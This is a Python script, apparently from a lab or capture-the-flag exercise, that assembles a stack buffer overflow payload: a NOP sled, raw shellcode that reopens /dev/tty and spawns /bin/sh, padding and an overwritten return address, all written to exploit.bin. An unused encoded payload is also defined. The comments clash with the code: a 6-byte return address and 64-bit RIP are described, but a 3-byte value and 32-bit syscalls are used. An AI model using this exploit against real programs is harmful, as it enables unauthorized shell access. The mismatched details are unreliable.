#!/usr/bin/python

# BUFER = 72
# SHELLCODE = 55
# NOP = 72 - 55 = 17 bytes
# Return address = 6 bytes
# RIP 0x7ffff7e200f5
# NOP = 0x90

nopsled = b"\x90" * 17


buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xcd\x45\x8c\xa4\xba"
buf += b"\xc7\xc8\x28\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\xa7\x6c\xd4\x3d\xd0\xc5\x97\x42\xcc"
buf += b"\x1b\x83\xa1\xf2\x50\x9a\xef\xc9\x61\x8e\xa4\xab"
buf += b"\x9b\x80\xa1\x2b\x2f\x9c\xfe\xd0\xf6\x90\x27\xc8"
buf += b"\x2f\xbe\xfc\xb5\xc2\x80\x19\x3b\x2f\xa7\xfc\xb5"
buf += b"\xc2\x80\xbf\xa7\x46\xd2\xec\x45\x09\xa2\x09\x95"
buf += b"\x4a\x89\xd1\x4c\xad\xf3\x70\x54\x0d\x37\x8b\xd8"
buf += b"\xae\xa6\x07\xbe\x2d\x8c\xf7\xf2\x4e\x2f\x7a\x9a"
buf += b"\x0d\x05\x42\xb5\xc2\xc8\x28"

print(len(buf))

shellcode = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
# 55 len

padding = b"A"*(72-17-55)

# 
eip = b"\xec\x11\x40"

print (nopsled + shellcode + padding + eip) 


f = open("exploit.bin", "wb")
f.write(nopsled + shellcode + padding + eip)
f.close()
